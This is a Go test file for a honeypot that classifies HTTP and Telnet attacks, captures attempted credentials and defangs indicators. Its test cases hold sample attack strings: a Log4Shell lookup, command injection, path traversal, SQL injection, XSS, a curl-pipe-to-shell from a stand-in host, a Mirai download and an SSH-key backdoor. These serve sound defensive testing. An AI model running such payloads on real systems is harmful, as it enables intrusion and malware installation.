package honeypot

import (
	"bufio"
	"context"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/jvch0512/honeynet-live/internal/events"
)

func TestClassifyHTTP(t *testing.T) {
	cases := []struct {
		method, url, ua, body string
		kind                  events.Kind
		minSev                int
		contains              string
	}{
		{"GET", "/", "${jndi:ldap://x/a}", "", events.Exploit, 4, "Log4Shell"},
		{"GET", "/ping?host=1.1.1.1;cat%20/etc/passwd", "curl", "", events.Exploit, 4, "Command injection"},
		{"GET", "/download?file=../../../../etc/passwd", "curl", "", events.Exploit, 3, "traversal"},
		{"GET", "/download?file=%2e%2e%2fsecret", "curl", "", events.Exploit, 3, "traversal"},
		{"GET", "/p?id=1%20UNION%20SELECT%20pass%20FROM%20u", "curl", "", events.Exploit, 3, "SQL"},
		{"GET", "/s?q=<script>alert(1)</script>", "curl", "", events.Exploit, 2, "scripting"},
		{"POST", "/wp-login.php", "Mozilla", "user=a&pass=b", events.BruteForce, 3, "Login attempt"},
		{"GET", "/.env", "Mozilla", "", events.Scan, 3, "sensitive"},
		{"GET", "/anything", "sqlmap/1.7", "", events.Scan, 2, "scanner"},
		{"GET", "/admin", "Mozilla", "", events.Probe, 2, "admin"},
		{"GET", "/favicon.ico", "Mozilla", "", events.Probe, 1, "does not exist"},
	}
	for _, c := range cases {
		v := ClassifyHTTP(c.method, c.url, c.ua, c.body)
		if v.Kind != c.kind || v.Severity < c.minSev || !strings.Contains(v.Summary, c.contains) {
			t.Errorf("%s %s: got %+v", c.method, c.url, v)
		}
	}
}

func TestParseShellAndURLs(t *testing.T) {
	cases := map[string]events.Kind{
		"wget http://198.51.100.7/bins/x -O /tmp/x":  events.Malware,
		"curl -s http://evil.example/a.sh | sh":      events.Malware,
		"chmod +x /tmp/x":                            events.Command,
		"cat /etc/passwd":                            events.Command,
		"echo ssh-rsa AAA >> ~/.ssh/authorized_keys": events.Command,
		"uname -a": events.Command,
		"ls":       events.Command,
	}
	for line, kind := range cases {
		if v := ParseShell(line); v.Kind != kind {
			t.Errorf("%q: %+v", line, v)
		}
	}
	if ParseShell("wget http://198.51.100.7/x").Severity != 4 || ParseShell("ls").Severity != 1 {
		t.Error("severity scale")
	}
	if got := ExtractURL("wget http://198.51.100.7/bins/mirai.arm7 -O /tmp/x"); got != "hxxp://198[.]51[.]100[.]7/bins/mirai[.]arm7" {
		t.Errorf("IOCs must be defanged before display: %s", got)
	}
	if ExtractURL("ls -la") != "" {
		t.Error("no URL expected")
	}
}

func TestParseProxyLine(t *testing.T) {
	if ip, ok := ParseProxyLine("PROXY TCP4 203.0.113.7 10.0.0.2 4000 23\r\n"); !ok || ip != "203.0.113.7" {
		t.Error("valid line")
	}
	for _, bad := range []string{"", "PROXY", "PROXY UDP4 1.1.1.1 2.2.2.2 1 2", "PROXY TCP4 notanip 2.2.2.2 1 2", "GET / HTTP/1.1", "PROXY TCP4 1.1.1.1 2.2.2.2 1"} {
		if _, ok := ParseProxyLine(bad); ok {
			t.Errorf("must reject %q", bad)
		}
	}
}

func lastEvents(s *events.Store) []events.Event { return s.Recent(0) }

func TestHTTPHoneypotBehaviour(t *testing.T) {
	st := events.NewStore()
	ts := httptest.NewServer(&HTTPHandler{Store: st, TrustXFF: true})
	defer ts.Close()

	resp, _ := http.Get(ts.URL + "/wp-login.php")
	page, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 || !strings.Contains(string(page), "<form") || !strings.HasPrefix(resp.Header.Get("Server"), "Apache") {
		t.Fatalf("fake login page expected: %d %s", resp.StatusCode, resp.Header.Get("Server"))
	}
	resp, _ = http.Post(ts.URL+"/wp-login.php", "application/x-www-form-urlencoded", strings.NewReader("user=admin&pass=hunter2"))
	if resp.StatusCode != 401 {
		t.Fatalf("failed login must return 401: %d", resp.StatusCode)
	}
	if r, _ := http.Get(ts.URL + "/.env"); r.StatusCode != 403 {
		t.Fatalf("sensitive paths return 403: %d", r.StatusCode)
	}
	if r, _ := http.Get(ts.URL + "/nope"); r.StatusCode != 404 {
		t.Fatalf("unknown paths 404: %d", r.StatusCode)
	}
	req, _ := http.NewRequest("GET", ts.URL+"/x", nil)
	req.Header.Set("X-Forwarded-For", "203.0.113.9, 10.0.0.1")
	http.DefaultClient.Do(req)

	evs := lastEvents(st)
	if evs[0].Source != "203.0.113.9" {
		t.Fatalf("XFF first hop expected with TrustXFF: %s", evs[0].Source)
	}
	if got := st.Stats().TopCreds; len(got) != 1 || got[0].Name != "admin / hunter2" {
		t.Fatalf("credentials must be captured: %+v", got)
	}
	var sawLogin bool
	for _, e := range evs {
		if e.Kind == events.BruteForce && strings.Contains(e.Detail, "creds tried: admin / hunter2") {
			sawLogin = true
		}
	}
	if !sawLogin {
		t.Fatal("login attempt event with credentials expected")
	}
}

func TestXFFIgnoredUnlessTrusted(t *testing.T) {
	st := events.NewStore()
	ts := httptest.NewServer(&HTTPHandler{Store: st})
	defer ts.Close()
	req, _ := http.NewRequest("GET", ts.URL+"/x", nil)
	req.Header.Set("X-Forwarded-For", "203.0.113.9")
	http.DefaultClient.Do(req)
	if src := lastEvents(st)[0].Source; src != "127.0.0.1" {
		t.Fatalf("attackers must not be able to spoof the source address: %s", src)
	}
	req.Header.Set("X-Forwarded-For", "not-an-ip")
	trusted := httptest.NewServer(&HTTPHandler{Store: st, TrustXFF: true})
	defer trusted.Close()
	req2, _ := http.NewRequest("GET", trusted.URL+"/x", nil)
	req2.Header.Set("X-Forwarded-For", "not-an-ip")
	http.DefaultClient.Do(req2)
	if src := lastEvents(st)[0].Source; src != "127.0.0.1" {
		t.Fatalf("garbage XFF must fall back to the socket address: %s", src)
	}
}

func TestHTTPBodyIsLimited(t *testing.T) {
	st := events.NewStore()
	ts := httptest.NewServer(&HTTPHandler{Store: st})
	defer ts.Close()
	big := strings.Repeat("A", 1<<20)
	resp, err := http.Post(ts.URL+"/admin", "text/plain", strings.NewReader(big))
	if err == nil {
		resp.Body.Close()
	}
	for _, e := range lastEvents(st) {
		if len(e.Detail) > 600 || len(e.Summary) > 200 {
			t.Fatalf("event fields must stay small, got %d bytes", len(e.Detail))
		}
	}
}

func startTelnet(t *testing.T, proxy bool) (string, *events.Store) {
	t.Helper()
	st := events.NewStore()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { (&Telnet{Store: st, ProxyProtocol: proxy}).Serve(ctx, ln); close(done) }()
	t.Cleanup(func() { cancel(); <-done })
	return ln.Addr().String(), st
}

func waitFor(t *testing.T, cond func() bool) {
	t.Helper()
	for i := 0; i < 100; i++ {
		if cond() {
			return
		}
		time.Sleep(30 * time.Millisecond)
	}
	t.Fatal("condition not met in time")
}

func TestTelnetSessionCapturesCredentialsAndCommands(t *testing.T) {
	addr, st := startTelnet(t, true)
	c, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close()
	go io.Copy(io.Discard, c)
	marker := os.TempDir() + "/honeynet_must_not_exist"
	os.Remove(marker)
	lines := []string{"PROXY TCP4 203.0.113.50 10.0.0.2 4000 23", "root", "xc3511", "admin", "admin", "root", "toor",
		"uname -a", "touch " + marker, "wget http://198.51.100.7/bins/mirai.arm7 -O /tmp/x", "exit"}
	for _, l := range lines {
		io.WriteString(c, l+"\r\n")
	}
	waitFor(t, func() bool {
		for _, e := range lastEvents(st) {
			if e.Kind == events.Malware {
				return true
			}
		}
		return false
	})
	var creds, malware, recon int
	for _, e := range lastEvents(st) {
		if e.Source != "203.0.113.50" {
			t.Fatalf("PROXY protocol source expected: %s", e.Source)
		}
		switch e.Kind {
		case events.BruteForce:
			creds++
		case events.Malware:
			malware++
			if e.IOC != "hxxp://198[.]51[.]100[.]7/bins/mirai[.]arm7" {
				t.Fatalf("IOC must be defanged: %s", e.IOC)
			}
		case events.Command:
			recon++
		}
	}
	if creds != 3 || malware != 1 || recon < 2 {
		t.Fatalf("creds=%d malware=%d commands=%d", creds, malware, recon)
	}
	if got := st.Stats().TopCreds; len(got) != 3 {
		t.Fatalf("three credential pairs expected: %+v", got)
	}
	if _, err := os.Stat(marker); err == nil {
		os.Remove(marker)
		t.Fatal("SAFETY: the honeypot executed an attacker command")
	}
}

func TestTelnetProxyHeaderIgnoredWhenDisabledAndGarbageIsSafe(t *testing.T) {
	addr, st := startTelnet(t, false)
	c, _ := net.Dial("tcp", addr)
	go io.Copy(io.Discard, c)
	io.WriteString(c, "PROXY TCP4 203.0.113.50 10.0.0.2 4000 23\r\n")
	c.Write([]byte{0xff, 0xfd, 0x01, 0x00, 0x1b})
	io.WriteString(c, strings.Repeat("A", 5000)+"\r\n")
	c.Close()
	waitFor(t, func() bool { return len(lastEvents(st)) >= 1 })
	for _, e := range lastEvents(st) {
		if e.Source == "203.0.113.50" {
			t.Fatal("the PROXY header must not be trusted when the flag is off")
		}
		if len(e.Detail) > 300 {
			t.Fatalf("over-long input must be truncated, got %d", len(e.Detail))
		}
	}
}

func TestTelnetShedsLoadAboveSessionCap(t *testing.T) {
	addr, _ := startTelnet(t, false)
	var conns []net.Conn
	for i := 0; i < maxSessions+10; i++ {
		c, err := net.Dial("tcp", addr)
		if err != nil {
			t.Fatal(err)
		}
		conns = append(conns, c)
	}
	closed := 0
	for _, c := range conns[maxSessions:] {
		c.SetReadDeadline(time.Now().Add(2 * time.Second))
		br := bufio.NewReader(c)
		for {
			if _, err := br.ReadByte(); err != nil {
				if ne, ok := err.(net.Error); !ok || !ne.Timeout() {
					closed++
				}
				break
			}
		}
	}
	for _, c := range conns {
		c.Close()
	}
	if closed == 0 {
		t.Fatal("connections beyond the cap must be refused instead of queued")
	}
}
